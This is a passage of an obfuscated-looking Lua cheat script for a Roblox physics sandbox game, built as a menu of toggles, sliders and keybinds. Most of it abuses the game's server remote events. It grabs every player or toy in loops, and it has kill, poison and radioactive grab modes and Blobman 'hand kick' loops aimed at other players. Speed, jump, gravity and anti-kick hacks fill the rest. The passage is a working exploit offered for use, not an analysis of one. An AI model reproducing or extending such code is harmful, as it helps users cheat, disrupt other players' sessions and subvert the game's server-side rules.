                            v543.ExtinguishPart.Position = vu7.me.Character.HumanoidRootPart.Position
                            task.wait()
                            v543.ExtinguishPart.Position = v544
                        end
                        vu7.backpack.FireExtinguisher.ExtinguishPart.Position = v544
                    elseif not vu7.me.InPlot.Value and vu7.me.CanSpawnToy.Value then
                        task.spawn(vu223, "FireExtinguisher")
                        while vu7.backpack:FindFirstChild("FireExtinguisher") == nil do
                            task.wait()
                        end
                    end
                end
            end
            task.wait()
        end
    end
})
local vu558 = v501:CreateToggle({
    Name = "Anti kick",
    CurrentValue = false,
    Flag = "AntiKick",
    Callback = function(p546)
        antikick = p546
        local function vu556()
            if vu1.w:FindFirstChild(vu7.myname) then
                local v547 = vu1.w[vu7.myname]:FindFirstChild("Right Leg")
                local v548 = vu1.w[vu7.myname]:FindFirstChild("Humanoid")
                local v549 = vu1.w[vu7.myname]:FindFirstChild("HumanoidRootPart")
                if v547 and (v548 and (v549 and (v548.Health ~= 0 and (v548:GetState() ~= Enum.HumanoidStateType.Dead and not vu7.me.InPlot.Value)))) then
                    local v550 = vu7.backpack:FindFirstChild("NinjaKunai")
                    if v550 then
                        local v551 = v550:FindFirstChild("StickyPart")
                        if v551 then
                            local v552 = v551:FindFirstChild("StickyWeld")
                            if v552 then
                                local v553 = v552.Part1
                                if v553 then
                                    if v553 ~= v547 then
                                        vu7.Events.DestroyToyEvent:FireServer(v550)
                                        task.wait()
                                        vu556()
                                    end
                                else
                                    vu7.Events.DestroyToyEvent:FireServer(v550)
                                    task.wait()
                                    vu556()
                                end
                            else
                                vu7.Events.DestroyToyEvent:FireServer(v550)
                                task.wait()
                                vu556()
                            end
                        else
                            vu7.Events.DestroyToyEvent:FireServer(v550)
                            task.wait()
                            vu556()
                        end
                    elseif vu7.me.InPlot.Value or not vu7.me.CanSpawnToy.Value then
                        if vu7.me.InPlot.Value then
                            lastt = true
                        end
                    else
                        if lastt then
                            lastt = false
                            task.wait(0.5)
                        end
                        task.spawn(vu223, "NinjaKunai")
                        while not vu7.backpack:FindFirstChild("NinjaKunai") do
                            task.wait()
                        end
                        local v554 = vu7.backpack:FindFirstChild("NinjaKunai").StickyPart
                        local v555 = v554.StickyWeld
                        vu410(v554, v549)
                        while v555.Part1 == nil do
                            vu7.Events.StickyPartEvent:FireServer(v554, v547, CFrame.new(0.0490287527, 0, 0, 0, 0.00739139877, - 0.999561906, - 0.998452604, - 0.0478846952, 0.0282763243, - 0.0476547107, 0.99882561, 0) * CFrame.Angles(0, 180, 0))
                            task.wait()
                        end
                    end
                end
            end
        end
        local v557 = vu556
        while antikick do
            v557()
            task.wait()
        end
    end
})
local vu560 = v501:CreateToggle({
    Name = "Anti Void",
    CurrentValue = false,
    Flag = "AntiVoid",
    Callback = function(p559)
        antivoid = p559
        if antivoid then
            vu1.w.FallenPartsDestroyHeight = - 10000
        else
            vu1.w.FallenPartsDestroyHeight = - 100
        end
    end
})
local vu567 = v501:CreateToggle({
    Name = "Water Walk",
    CurrentValue = false,
    Flag = "WaterWalk",
    Callback = function(_)
        local v561 = vu7.m.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel
        local v562 = not v561.Ocean.CanCollide
        local v563, v564, v565 = pairs(v561:GetChildren())
        while true do
            local v566
            v565, v566 = v563(v564, v565)
            if v565 == nil then
                break
            end
            if v566:IsA("Part") and v566.Name == "Ocean" then
                v566.CanCollide = v562
            end
        end
    end
})
local vu573 = v501:CreateToggle({
    Name = "Anti Seat Reset",
    CurrentValue = false,
    Flag = "AntiSeatReset",
    Callback = function(p568)
        antiseat = p568
        local v569 = nil
        while antiseat and task.wait() do
            local v570 = vu7.me.Character
            if v570 then
                local v571 = v570:FindFirstChild("Humanoid")
                if v571 then
                    local v572
                    if v571.SeatPart then
                        v569 = v571.SeatPart
                        v572 = true
                    else
                        v572 = false
                    end
                    if vu7.me.IsHeld.Value and v572 then
                        while vu7.me.IsHeld.Value do
                            task.wait(0.3)
                        end
                        while v571.SeatPart ~= v569 and task.wait(0.3) do
                            v569:Sit(v571)
                        end
                    end
                end
            end
        end
    end
})
local vu589 = v501:CreateToggle({
    Name = "Anti Lag",
    CurrentValue = false,
    Flag = "AntiLag",
    Callback = function(p574)
        AntiLaggg = p574
        if AntiLaggg then
            local v575, v576, v577 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v578
                v577, v578 = v575(v576, v577)
                if v577 == nil then
                    break
                end
                if v578 ~= vu7.me and v578:FindFirstChild("BeamColor") then
                    v578.BeamColor.Name = "BeamColorr"
                end
            end
        else
            local v579, v580, v581 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v582
                v581, v582 = v579(v580, v581)
                if v581 == nil then
                    break
                end
                if v582 ~= vu7.me and v582:FindFirstChild("BeamColorr") then
                    v582.BeamColorr.Name = "BeamColor"
                end
            end
            task.wait(0.1)
            local v583 = true
            while v583 do
                local v584, v585, v586 = vu1.w:GetDescendants()
                local v587 = 0
                while true do
                    local v588
                    v586, v588 = v584(v585, v586)
                    if v586 == nil then
                        break
                    end
                    if v588.Name == "GrabParts" then
                        v587 = v587 + 1
                        v588:Destroy()
                    end
                end
                task.wait()
                if v587 == 0 then
                    v583 = false
                end
            end
        end
    end
})
v501:CreateSection("Protections Binds")
v501:CreateKeybind({
    Name = "Anti Grab Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiGrabBind",
    Callback = function(_)
        vu93("Anti Grab" .. " is a " .. (not antiGrabToggle and "En" or "Dis") .. "abled")
        vu513:Set(not antiGrabToggle)
    end
})
v501:CreateKeybind({
    Name = "Anti Grab Loop Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiGrabLoopBind",
    Callback = function(_)
        vu93("Anti Grab Loop" .. " is a " .. (not antigrabloop and "En" or "Dis") .. "abled")
        vu525:Set(not antigrabloop)
    end
})
v501:CreateKeybind({
    Name = "Anti Grab Tp Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiGrabTpBind",
    Callback = function(_)
        vu93("Anti Grab Tp" .. " is a " .. (not antigrabtp and "En" or "Dis") .. "abled")
        vu529:Set(not antigrabtp)
    end
})
v501:CreateKeybind({
    Name = "Anti Blob Kick Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiBlobKickBind",
    Callback = function(_)
        vu93("Anti Blob Kick" .. " is a " .. (not antiblob and "En" or "Dis") .. "abled")
        vu537:Set(not antiblob)
    end
})
v501:CreateKeybind({
    Name = "Anti Explosion Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiExplosionBind",
    Callback = function(_)
        vu93("Anti Explosion" .. " is a " .. (not antiexpl and "En" or "Dis") .. "abled")
        vu539:Set(not antiexpl)
    end
})
v501:CreateKeybind({
    Name = "Anti Burn Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiBurnBind",
    Callback = function(_)
        vu93("Anti Burn" .. " is a " .. (not antiburn and "En" or "Dis") .. "abled")
        vu545:Set(not antiburn)
    end
})
v501:CreateKeybind({
    Name = "Anti Kick Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiKickBind",
    Callback = function(_)
        vu93("Anti Kick" .. " is a " .. (not antikick and "En" or "Dis") .. "abled")
        vu558:Set(not antikick)
    end
})
v501:CreateKeybind({
    Name = "Anti Void Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiVoidBind",
    Callback = function(_)
        vu93("Anti Void" .. " is a " .. (not antivoid and "En" or "Dis") .. "abled")
        vu560:Set(not antivoid)
    end
})
v501:CreateKeybind({
    Name = "Water Walk Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "WaterWalkBind",
    Callback = function(_)
        local v590 = not vu7.m.AlwaysHereTweenedObjects.Ocean.Object.ObjectModel.Ocean.CanCollide
        vu93("Water Walk" .. " is a " .. (not v590 and "En" or "Dis") .. "abled")
        vu567:Set(not v590)
    end
})
v501:CreateKeybind({
    Name = "Anti Seat Reset Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiSeatResetBind",
    Callback = function(_)
        vu93("Anti Seat Reset" .. " is a " .. (not antiseat and "En" or "Dis") .. "abled")
        vu573:Set(not antiseat)
    end
})
v501:CreateKeybind({
    Name = "Anti Lag Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "AntiLagBind",
    Callback = function(_)
        vu93("Anti Lag" .. " is a " .. (not AntiLaggg and "En" or "Dis") .. "abled")
        vu589:Set(not AntiLaggg)
    end
})
v501:CreateSection("Animations")
v501:CreateToggle({
    Name = "Play Typing Animation",
    CurrentValue = false,
    Flag = "PlayTypingAnimation",
    Callback = function(p591)
        if p591 then
            typingTrack:Play()
        else
            typingTrack:Stop()
        end
    end
})
v501:CreateToggle({
    Name = "Fly Crouch",
    CurrentValue = false,
    Flag = "FlyCrouch",
    Callback = function(p592)
        if p592 then
            crouchTrack:Play()
        else
            crouchTrack:Stop()
        end
    end
})
v501:CreateToggle({
    Name = "Throwed Animation",
    CurrentValue = false,
    Flag = "ThrowedAnimation",
    Callback = function(p593)
        if p593 then
            throwedTrack:Play()
        else
            throwedTrack:Stop()
        end
    end
})
v501:CreateSection("Walk Speed")
local vu595 = v501:CreateToggle({
    Name = "Walk Speed Toggle",
    CurrentValue = false,
    Flag = "WalkSpeedToggle",
    Callback = function(p594)
        wst = p594
        while wst do
            if vu7.me.Character ~= nil and vu7.me.Character.Humanoid ~= nil then
                vu7.me.Character:WaitForChild("HumanoidRootPart").CFrame = vu7.me.Character:WaitForChild("HumanoidRootPart").CFrame + vu7.me.Character:WaitForChild("Humanoid").MoveDirection * (vu8.wss / 10)
            end
            task.wait()
        end
        if vu7.me.Character ~= nil and vu7.me.Character.Humanoid ~= nil then
            vu7.me.Character.Humanoid.WalkSpeed = 16
        end
    end
})
v501:CreateSlider({
    Name = "Walk Speed Slider",
    Range = {
        0,
        300
    },
    Increment = 1,
    Suffix = "(5 Optimal)",
    CurrentValue = 5,
    Flag = "WalkSpeedSlider",
    Callback = function(p596)
        vu8.wss = p596
    end
})
v501:CreateKeybind({
    Name = "Walk Speed Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "WalkSpeedBind",
    Callback = function(_)
        vu93("Walk Speed" .. " is a " .. (not wst and "En" or "Dis") .. "abled")
        vu595:Set(not wst)
    end
})
v501:CreateSection("Jump Power")
local vu598 = v501:CreateToggle({
    Name = "Jump Power Toggle",
    CurrentValue = false,
    Flag = "JumpPowerToggle",
    Callback = function(p597)
        jpt = p597
        while jpt do
            if vu7.me.Character ~= nil and vu7.me.Character.Humanoid ~= nil then
                vu7.me.Character.Humanoid.JumpPower = vu8.jps
                task.wait()
            end
            task.wait()
        end
        if vu7.me.Character ~= nil and vu7.me.Character.Humanoid ~= nil then
            vu7.me.Character.Humanoid.JumpPower = 24
        end
    end
})
v501:CreateToggle({
    Name = "Inf Jump",
    CurrentValue = false,
    Flag = "InfJump",
    Callback = function(p599)
        infj = p599
    end
})
v501:CreateSlider({
    Name = "Jump Power Slider",
    Range = {
        0,
        500
    },
    Increment = 10,
    Suffix = "(50 Optimal)",
    CurrentValue = 50,
    Flag = "JumpPowerSlider",
    Callback = function(p600)
        vu8.jps = p600
    end
})
v501:CreateKeybind({
    Name = "Jump Power Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "JumpPowerBind",
    Callback = function(_)
        vu93("Jump Power" .. " is a " .. (not jpt and "En" or "Dis") .. "abled")
        vu598:Set(not jpt)
    end
})
v501:CreateSection("Gravity")
local vu602 = v501:CreateToggle({
    Name = "Gravity Toggle",
    CurrentValue = false,
    Flag = "GravityToggle",
    Callback = function(p601)
        gt = p601
        while gt do
            vu1.w.Gravity = vu8.gs
            task.wait()
        end
        vu1.w.Gravity = 100
    end
})
v501:CreateSlider({
    Name = "Gravity Slider",
    Range = {
        0,
        1000
    },
    Increment = 10,
    Suffix = "",
    CurrentValue = 100,
    Flag = "GravitySlider",
    Callback = function(p603)
        vu8.gs = p603
    end
})
v501:CreateKeybind({
    Name = "Gravity Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "GravityBind",
    Callback = function(_)
        vu93("Gravity" .. " is a " .. (not gt and "En" or "Dis") .. "abled")
        vu602:Set(not gt)
    end
})
local v604 = v491:CreateTab("Grab And Line Mods", 7733954884)
v604:CreateSection("Basic Grab Mods")
local vu606 = v604:CreateToggle({
    Name = "Poison Grab",
    CurrentValue = false,
    Flag = "PoisonGrab",
    Callback = function(p605)
        poison = p605
    end
})
local vu608 = v604:CreateToggle({
    Name = "Radioactive Grab",
    CurrentValue = false,
    Flag = "RadioactiveGrab",
    Callback = function(p607)
        radiactive = p607
    end
})
local vu610 = v604:CreateToggle({
    Name = "Kill Grab",
    CurrentValue = false,
    Flag = "KillGrab",
    Callback = function(p609)
        killg = p609
    end
})
local vu612 = v604:CreateToggle({
    Name = "Noclip Grab",
    CurrentValue = false,
    Flag = "NoclipGrab",
    Callback = function(p611)
        clippp = p611
    end
})
v604:CreateSection("Basic Grab Mods Binds")
v604:CreateKeybind({
    Name = "Poison Grab Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "PoisonGrabBind",
    Callback = function(_)
        vu93("Poison Grab" .. " is a " .. (not poison and "En" or "Dis") .. "abled")
        vu606:Set(not poison)
    end
})
v604:CreateKeybind({
    Name = "Radioactive Grab Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "RadioactiveGrabBind",
    Callback = function(_)
        vu93("Radioactive Grab" .. " is a " .. (not radiactive and "En" or "Dis") .. "abled")
        vu608:Set(not radiactive)
    end
})
v604:CreateKeybind({
    Name = "Kill Grab Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "KillGrabBind",
    Callback = function(_)
        vu93("Kill Grab" .. " is a " .. (not killg and "En" or "Dis") .. "abled")
        vu610:Set(not killg)
    end
})
v604:CreateKeybind({
    Name = "Noclip Grab Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "NoclipGrabBind",
    Callback = function(_)
        vu93("Noclip Grab" .. " is a " .. (not clippp and "En" or "Dis") .. "abled")
        vu612:Set(not clippp)
    end
})
v604:CreateSection("Advanced Grab Mods")
local vu614 = v604:CreateToggle({
    Name = "Crazy Grab",
    CurrentValue = false,
    Flag = "CrazyGrab",
    Callback = function(p613)
        kickkk1 = p613
    end
})
local vu616 = v604:CreateToggle({
    Name = "Sky Grab",
    CurrentValue = false,
    Flag = "SkyGrab",
    Callback = function(p615)
        kickkk2 = p615
    end
})
local vu618 = v604:CreateToggle({
    Name = "Ultra Grab",
    CurrentValue = false,
    Flag = "UltraGrab",
    Callback = function(p617)
        ultragrabbb = p617
    end
})
local vu620 = v604:CreateToggle({
    Name = "Ultra Click Grab",
    CurrentValue = false,
    Flag = "UltraClickGrab",
    Callback = function(p619)
        ultraclickgrab = p619
        while ultraclickgrab do
            vu411(vu7.mouse.Target)
            task.wait()
        end
    end
})
v604:CreateToggle({
    Name = "Inf Zoom",
    CurrentValue = false,
    Flag = "InfZoom",
    Callback = function(p621)
        zgt = p621
    end
})
v604:CreateSection("Advanced Grab Mods Binds")
v604:CreateKeybind({
    Name = "Crazy Grab Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "CrazyGrabBind",
    Callback = function(_)
        vu93("Crazy Grab" .. " is a " .. (not kickkk1 and "En" or "Dis") .. "abled")
        vu614:Set(not kickkk1)
    end
})
v604:CreateKeybind({
    Name = "Sky Grab Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "SkyGrabBind",
    Callback = function(_)
        vu93("Sky Grab" .. " is a " .. (not kickkk2 and "En" or "Dis") .. "abled")
        vu616:Set(not kickkk2)
    end
})
v604:CreateKeybind({
    Name = "Ultra Grab Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "UltraGrabBind",
    Callback = function(_)
        vu93("Ultra Grab" .. " is a " .. (not ultragrabbb and "En" or "Dis") .. "abled")
        vu618:Set(not ultragrabbb)
    end
})
v604:CreateKeybind({
    Name = "Ultra Click Grab Bind",
    CurrentKeybind = "",
    HoldToInteract = false,
    Flag = "UltraClickGrabBind",
    Callback = function(_)
        vu93("Ultra Click Grab" .. " is a " .. (not ultraclickgrab and "En" or "Dis") .. "abled")
        vu620:Set(not ultraclickgrab)
    end
})
v604:CreateSection("Basic Line Mods")
v604:CreateToggle({
    Name = "Invisble Line",
    CurrentValue = false,
    Flag = "InvisbleLine",
    Callback = function(p622)
        invisline = p622
        while invisline do
            vu7.Events.CreateGrabEvent:FireServer()
            task.wait()
        end
    end
})
v604:CreateToggle({
    Name = "Extend Line",
    CurrentValue = false,
    Flag = "ExtendLine",
    Callback = function(p623)
        extende = p623
        while extende do
            vu7.Events.ExtendLineEvent:FireServer(1000000)
            task.wait()
        end
    end
})
v604:CreateToggle({
    Name = "Crazy Line(Grab All Players)",
    CurrentValue = false,
    Flag = "CrazyLine",
    Callback = function(p624)
        crazyline = p624
        while crazyline do
            local v625, v626, v627 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v628
                v627, v628 = v625(v626, v627)
                if v627 == nil then
                    break
                end
                local v629 = v628.Character
                if v629 then
                    local v630 = v629:FindFirstChild("Head")
                    if v630 then
                        vu7.Events.CreateGrabEvent:FireServer(v630, v630.CFrame)
                        task.wait()
                    end
                end
            end
        end
    end
})
v604:CreateToggle({
    Name = "Crazy Line(Grab All Parts)",
    CurrentValue = false,
    Flag = "CrazyLine2",
    Callback = function(p631)
        crazyline2 = p631
        while crazyline2 do
            local v632, v633, v634 = pairs(vu7.m:GetDescendants())
            while true do
                local v635
                v634, v635 = v632(v633, v634)
                if v634 == nil then
                    break
                end
                if v635:IsA("Part") and crazyline2 then
                    vu7.Events.CreateGrabEvent:FireServer(v635, v635.CFrame)
                    task.wait()
                end
            end
        end
    end
})
v604:CreateToggle({
    Name = "Crazy Line(Grab All Toys)",
    CurrentValue = false,
    Flag = "CrazyLine3",
    Callback = function(p636)
        crazyline3 = p636
        while crazyline3 do
            local v637, v638, v639 = ipairs(vu1.Players:GetPlayers())
            while true do
                local v640
                v639, v640 = v637(v638, v639)
                if v639 == nil then
                    break
                end
                local v641, v642, v643 = pairs(vu1.w[v640.Name .. "SpawnedInToys"]:GetChildren())
                while true do
                    local v644
                    v643, v644 = v641(v642, v643)
                    if v643 == nil then
                        break
                    end
                    local v645, v646, v647 = pairs(v644:GetChildren())
                    while true do
                        local v648
                        v647, v648 = v645(v646, v647)
                        if v647 == nil then
                            break
                        end
                        if v648:IsA("Part") and crazyline3 then
                            vu7.Events.CreateGrabEvent:FireServer(v648, v648.CFrame)
                            task.wait()
                        end
                    end
                end
            end
        end
    end
})
v604:CreateSection("Advanced Line Mods")
v604:CreateToggle({
    Name = "Loop Random Line Color",
    CurrentValue = false,
    Flag = "LoopRandomLineColor",
    Callback = function(p649)
        rgb = p649
        local v650 = vu7.me.BeamColor.ColorSequenceHolder.Color
        while rgb do
            if vu8.linecolorscount ~= 1 then
                if vu8.linecolorscount ~= 2 then
                    if vu8.linecolorscount ~= 20 then
                        local v651 = {
                            ColorSequenceKeypoint.new(0, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255)))
                        }
                        for v652 = 0, vu8.linecolorscount do
                            if v652 ~= 1 then
                                if v652 == vu8.linecolorscount then
                                    table.insert(v651, ColorSequenceKeypoint.new(1, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))))
                                else
                                    table.insert(v651, ColorSequenceKeypoint.new(1 / vu8.linecolorscount * v652, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))))
                                end
                            end
                        end
                        vu7.Events.SetLineColorEvent:FireServer(ColorSequence.new(v651))
                        task.wait()
                    else
                        local v653 = {
                            ColorSequence.new({
                                ColorSequenceKeypoint.new(0, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.05, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.1, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.15, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.2, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.25, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.3, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.35, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.4, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.45, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.55, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.6, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.65, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.7, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.75, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.8, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.85, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(0.9, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                                ColorSequenceKeypoint.new(1, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255)))
                            })
                        }
                        vu7.Events.SetLineColorEvent:FireServer(unpack(v653))
                        task.wait()
                    end
                else
                    vu7.Events.SetLineColorEvent:FireServer(ColorSequence.new({
                        ColorSequenceKeypoint.new(0, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255)))
                    }))
                    task.wait()
                end
            else
                vu7.Events.SetLineColorEvent:FireServer(ColorSequence.new(Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))))
                task.wait()
            end
        end
        vu7.Events.SetLineColorEvent:FireServer(v650)
    end
})
v604:CreateSlider({
    Name = "Line Colors Count Slider",
    Range = {
        1,
        20
    },
    Increment = 1,
    Suffix = "",
    CurrentValue = 2,
    Flag = "LineColorsCountSlider",
    Callback = function(p654)
        vu8.linecolorscount = p654
    end
})
v604:CreateSection("Set Custom Line Color(20 Colors)")
v604:CreateColorPicker({
    Name = "Line Color 1",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p655)
        vu12.ccolors[1] = p655
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 2",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p656)
        vu12.ccolors[2] = p656
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 3",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p657)
        vu12.ccolors[3] = p657
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 4",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p658)
        vu12.ccolors[4] = p658
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 5",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p659)
        vu12.ccolors[5] = p659
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 6",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p660)
        vu12.ccolors[6] = p660
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 7",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p661)
        vu12.ccolors[7] = p661
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 8",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p662)
        vu12.ccolors[8] = p662
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 9",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p663)
        vu12.ccolors[9] = p663
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 10",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p664)
        vu12.ccolors[10] = p664
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 11",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p665)
        vu12.ccolors[11] = p665
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 12",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p666)
        vu12.ccolors[12] = p666
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 13",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p667)
        vu12.ccolors[13] = p667
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 14",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p668)
        vu12.ccolors[14] = p668
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 15",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p669)
        vu12.ccolors[15] = p669
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 16",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p670)
        vu12.ccolors[16] = p670
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 17",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p671)
        vu12.ccolors[17] = p671
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 18",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p672)
        vu12.ccolors[18] = p672
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 19",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p673)
        vu12.ccolors[19] = p673
        vu388()
    end
})
v604:CreateColorPicker({
    Name = "Line Color 20",
    Color = Color3.fromRGB(0, 0, 0),
    Callback = function(p674)
        vu12.ccolors[20] = p674
        vu388()
    end
})
local v675 = v491:CreateTab("Blobman Functions", 7733916988)
local vu676 = v675:CreateLabel("Kicked: " .. vu8.kickcountc)
v675:CreateSection("Basic Functions")
v675:CreateToggle({
    Name = "Left Hand Kick",
    CurrentValue = false,
    Callback = function(p677)
        lhk = p677
        while lhk and task.wait() do
            local v678, v679, v680 = pairs(vu11.lplr)
            while true do
                local v681
                v680, v681 = v678(v679, v680)
                if v680 == nil then
                    break
                end
                local v682 = vu1.w:FindFirstChild(v681)
                if vu7.me.Character and v682 then
                    local vu683 = v682:FindFirstChild("HumanoidRootPart")
                    local v684 = vu7.me.Character:FindFirstChild("Humanoid")
                    if vu683 and v684 then
                        local v685 = v684.SeatPart
                        if v685 then
                            local vu686 = v685.Parent
                            if vu686.Name == "CreatureBlobman" then
                                if ik then
                                    vu438(vu686, vu683, "Left", 1)
                                    if ksm then
                                        task.delay(0.035, function()
                                            vu438(vu686, vu683, "Left", 1)
                                        end)
                                    end
                                    if twohand then
                                        vu438(vu686, vu683, "Right", 1)
                                        if ksm then
                                            task.delay(0.035, function()
                                                vu438(vu686, vu683, "Right", 1)
                                            end)
                                        end
                                    end
                                else
                                    vu438(vu686, vu683, "Left", 1)
                                    if ksm then
                                        task.delay(0.035, function()
                                            vu438(vu686, vu683, "Left", 1)
                                        end)
                                    else
                                        task.wait((10 - vu8.ks) / 10)
                                    end
                                    if twohand then
                                        vu438(vu686, vu683, "Right", 1)
                                        if ksm then
                                            task.delay(0.035, function()
                                                vu438(vu686, vu683, "Right", 1)
                                            end)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
})
v675:CreateToggle({
    Name = "Right Hand Kick",
    CurrentValue = false,
    Callback = function(p687)
        rhk = p687
        while rhk and task.wait() do
            local v688, v689, v690 = pairs(vu11.rplr)
            while true do
                local v691
                v690, v691 = v688(v689, v690)
                if v690 == nil then
                    break
                end
                local v692 = vu1.w:FindFirstChild(v691)
                if vu7.me.Character and v692 then
                    local vu693 = v692:FindFirstChild("HumanoidRootPart")
                    local v694 = vu7.me.Character:FindFirstChild("Humanoid")
                    if vu693 and v694 then
                        local v695 = v694.SeatPart
                        if v695 then
                            local vu696 = v695.Parent
                            if vu696.Name == "CreatureBlobman" then
                                if ik then
                                    vu438(vu696, vu693, "Right", 1)
                                    if ksm then
                                        task.delay(0.035, function()
                                            vu438(vu696, vu693, "Right", 1)
                                        end)
                                    end
                                    if twohand then
                                        vu438(vu696, vu693, "Left", 1)
                                        if ksm then
                                            task.delay(0.035, function()
                                                vu438(vu696, vu693, "Left", 1)
                                            end)
                                        end
                                    end
                                else
                                    vu438(vu696, vu693, "Right", 1)
                                    if ksm then
                                        task.delay(0.035, function()
                                            vu438(vu696, vu693, "Right", 1)
                                        end)
                                    else
                                        task.wait((10 - vu8.ks) / 10)
                                    end
                                    if twohand then
                                        vu438(vu696, vu693, "Left", 1)
                                        if ksm then
                                            task.delay(0.035, function()
                                                vu438(vu696, vu693, "Left", 1)
                                            end)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
})
